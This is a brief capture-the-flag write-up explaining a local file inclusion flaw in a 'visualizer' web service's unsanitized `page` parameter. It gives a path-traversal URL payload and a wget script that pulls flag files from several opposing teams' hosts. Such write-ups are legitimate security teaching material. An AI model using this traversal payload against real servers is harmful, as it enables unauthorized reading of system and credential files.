Visualizer writeup
===========
### Vulnerability
There is a local file inclusion vulnerability in the visualizer system. \
The vulnerability originates from `static_page` in `web/web.py` since this page
does not check or sanitize the GET parameters of `page`.

### Payload
The following is a payload used in the attack.\
`http://10.0.101.103/get?page=../../../../var/ctf/flag`

### Full Exploit Code
A simple bash script using `wget` is sufficient.
```bash
wget http://10.0.102.103/get?page=../../../../var/ctf/flag -O flag_viz_team2
wget http://10.0.103.103/get?page=../../../../var/ctf/flag -O flag_viz_team3
wget http://10.0.104.103/get?page=../../../../var/ctf/flag -O flag_viz_team4
wget http://10.0.105.103/get?page=../../../../var/ctf/flag -O flag_viz_team5
wget http://10.0.106.103/get?page=../../../../var/ctf/flag -O flag_viz_team6
```
